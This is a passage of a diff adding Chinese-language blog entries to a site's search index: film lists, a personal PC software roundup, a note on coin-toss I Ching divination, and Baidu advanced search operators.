title="韩国："></a>韩国：</h3><pre class="line-numbers language-none"><code class="language-none">《夺宝联盟》《鸣梁海战》《釜山行》《流感》《摩天楼》《卑劣的街头》《金福南杀人事件始末》《新世界》《高地战》《坏家伙的全胜时代》《出租车司机》《老手》《太极旗飘扬》《犯罪都市》《局内人》《老男孩》《孤胆特工》《蒙太奇》《追击者》《黄海》《恐怖直播》《阿修罗》  《特工》<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="欧美："><a href="#欧美：" class="headerlink" title="欧美："></a>欧美：</h3><pre class="line-numbers language-none"><code class="language-none">《肖申克的救赎》《暴力街区》《食人鱼》《巴霍巴利王》《猩球崛起1》《爱的那点性事》《死神5》《食物链 三级》《行尸走肉 美剧》《低俗小说》《战争之王》《被解救的姜戈》《血钻》《割喉岛》《未来水世界》<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="泰国"><a href="#泰国" class="headerlink" title="泰国:"></a>泰国:</h3><pre class="line-numbers language-none"><code class="language-none">《天才枪手》<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="战争："><a href="#战争：" class="headerlink" title="战争："></a>战争：</h3><pre class="line-numbers language-none"><code class="language-none">《t-34坦克》《兵临城下》《地雷区》《血战钢锯岭》《帝国的毁灭》《女狙击手》《猎杀U-571》《前哨》《冒牌上尉》<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 影音娱乐 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 电影 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>电脑软件</title>
+      <link href="/2022/03/05/%E7%94%B5%E8%84%91%E8%BD%AF%E4%BB%B6/"/>
+      <url>/2022/03/05/%E7%94%B5%E8%84%91%E8%BD%AF%E4%BB%B6/</url>
+      
+        <content type="html"><![CDATA[<h2 id="电脑软件"><a href="#电脑软件" class="headerlink" title="电脑软件"></a>电脑软件</h2><h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><pre class="line-numbers language-none"><code class="language-none">Chrome（插件使用：视频解析，去广告，油猴脚本，番羽墙，网页视频下载,IDM）Firefox（同上）Edge (Win10自带浏览器，使用chromium内核)Tor browser(暗网专用浏览器、通信加密)通用插件：IDM （满速下载）TamperMonkey (脚本管理，暴力猴更方便)Vimium -c (网页vim控制)Adblock&#x2F;uBlock (屏蔽广告)沙拉查词 (网页划词翻译)Vimium (键盘控制网页，类vim操作习惯)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="游戏平台"><a href="#游戏平台" class="headerlink" title="游戏平台"></a>游戏平台</h3><pre class="line-numbers language-none"><code class="language-none">WeGameSteam约战竞技场 约战<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="音视频软件"><a href="#音视频软件" class="headerlink" title="音视频软件"></a>音视频软件</h3><pre class="line-numbers language-none"><code class="language-none">网易云音乐Listen1(聚合平台)Potplayer（视频播放器，倍速播放）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h3><pre class="line-numbers language-none"><code class="language-none">迅雷极速版（界面简单，不限速）百度网盘（付费才是硬道理）PanDownload（已废）IDM&#x2F;FDM（多线程下载工具，配合浏览器插件用）  Aria2 (吃配置，一直不会配置)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h3><pre class="line-numbers language-none"><code class="language-none">ShadowSocksR（科学上网）NetchwinXray<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="办公"><a href="#办公" class="headerlink" title="办公"></a>办公</h3><pre class="line-numbers language-none"><code class="language-none">稻壳阅读器（文档阅读搜索）X-Mind （思维导图）StarDict(桌面划词翻译，对linux友好，windows推荐copytranslator)Office套件CAD（绘图）Drawio (类Visio绘图工具) 在线地址VS Code (代码编辑器，丰富插件)  Notepads (notepad替代品)  Windows Terminal (命令行终端)  VMVare（PC镜像，虚拟机实现）易字帖<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统优化工具"><a href="#系统优化工具" class="headerlink" title="系统优化工具"></a>系统优化工具</h3><pre class="line-numbers language-none"><code class="language-none">Dism++(清理工具)Rainmeter（桌面美化）火绒（杀毒工具）Quicker（快捷导航）  TrafficMonitor（网速、系统占用桌面小工具）  XMeters（网速、系统占用桌面小工具）ContextMenu (右键菜单管理) Github地址GEEK（彻底卸载软件）鲁大师（初始驱动安装）卡硬工具箱（硬件测试，装机必备）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="屏幕显示"><a href="#屏幕显示" class="headerlink" title="屏幕显示"></a>屏幕显示</h3><pre class="line-numbers language-none"><code class="language-none">f.lux (防蓝光屏幕设置)Didplayfusion（多显示器设置）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="文件相关"><a href="#文件相关" class="headerlink" title="文件相关"></a>文件相关</h3><pre class="line-numbers language-none"><code class="language-none">Everything（全局搜索，秒搜文件）Spacesniffer（查看本地磁盘占用）Bandzip（压缩文件）Q-Dir(多窗口资源管理器)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h3><pre class="line-numbers language-none"><code class="language-none">ToDesk www.todesk.com 推荐TeamViewer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="图片浏览"><a href="#图片浏览" class="headerlink" title="图片浏览"></a>图片浏览</h3><pre class="line-numbers language-none"><code class="language-none">ImageGlass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="手机相关"><a href="#手机相关" class="headerlink" title="手机相关"></a>手机相关</h3><pre class="line-numbers language-none"><code class="language-none">DroidCam(电脑调用手机摄像头，麦克风)Scrcpy (电脑控制手机工具) Github地址逍遥模拟器（手机模拟器）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 软件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> tor </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>金钱卦</title>
+      <link href="/2022/03/05/%E9%87%91%E9%92%B1%E5%8D%A6/"/>
+      <url>/2022/03/05/%E9%87%91%E9%92%B1%E5%8D%A6/</url>
+      
+        <content type="html"><![CDATA[<h2 id="金钱卦"><a href="#金钱卦" class="headerlink" title="金钱卦"></a>金钱卦</h2><h3 id="起卦"><a href="#起卦" class="headerlink" title="起卦"></a>起卦</h3><p>三枚硬币，国徽为阳面，面值为阴面，摇六次得出六爻一卦（从底至上装）。<br>四种结果：</p><table><thead><tr><th align="center">结果</th><th align="center">画法</th><th align="center">爻</th></tr></thead><tbody><tr><td align="center">一徽两字</td><td align="center">‘</td><td align="center">少阳</td></tr><tr><td align="center">一字两徽</td><td align="center">“</td><td align="center">少阴</td></tr><tr><td align="center">三徽</td><td align="center">⭕</td><td align="center">老阳</td></tr><tr><td align="center">三字</td><td align="center">×</td><td align="center">老阴</td></tr></tbody></table><p>实例：<br>第一次摇得一背，画作 ′；二次得两背，画作 ″；三次得三背，画作“○”；四次得三字，画作“×”；五次得三背，画作“○”；六次得两背，画作 ″；画法如下：<br><img src="/2022/03/05/%E9%87%91%E9%92%B1%E5%8D%A6/%E5%AE%9E%E4%BE%8B%E5%8D%A6%E8%B1%A1.png" alt="实例卦象"></p><h3 id="断卦"><a href="#断卦" class="headerlink" title="断卦"></a>断卦</h3><p>六爻安定：以本卦卦辞断之<br>一爻动：以动爻之爻辞断之<br>两爻动：<br>    1. 一阴一阳，取阴爻之爻辞断之（阳主过去，阴主未来）<br>    2. 两爻相同，取上动之爻辞断之<br>三爻动：以所动三爻中间一爻之爻辞为断（南怀瑾）以本卦和变卦卦辞断（朱熹）<br>四爻动：以变卦下静之爻辞断之(朱熹)<br>五爻动：以变卦静爻爻辞断之(朱熹)<br>六爻动：<br>    1. 如果是乾坤二卦，以用九、用六之辞断之<br>    2. 其余各卦以变卦的彖辞断之</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 古典文学 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 易 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>高级搜索指令</title>
+      <link href="/2022/03/05/%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2%E6%8C%87%E4%BB%A4/"/>
+      <url>/2022/03/05/%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2%E6%8C%87%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<h2 id="百度高级搜索指令"><a href="#百度高级搜索指令" class="headerlink" title="百度高级搜索指令"></a>百度高级搜索指令</h2><p>搜索内容（空格）+</p><ul><li>intitle:xxx<br>指定标题含有关键词</li><li>site:xxx<br>指定在某网站内搜索，例：baidu.com</li><li>inurl:xxx<br>指定url中包含内容</li><li>“” or 《》<br>精确搜索，搜索词不被拆分，书名号有特殊含义</li><li>+or-<br>包含或不含关键词</li><li>filetype:xxx<br>附加条件，指定搜索的文件格式:pdf,ppt,xls,doc,jpg,txt,torrent,all(所有格式)</li><li>yyyy..yyyy<br>限定时间，例：2020..2021</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> PC </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 效率 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
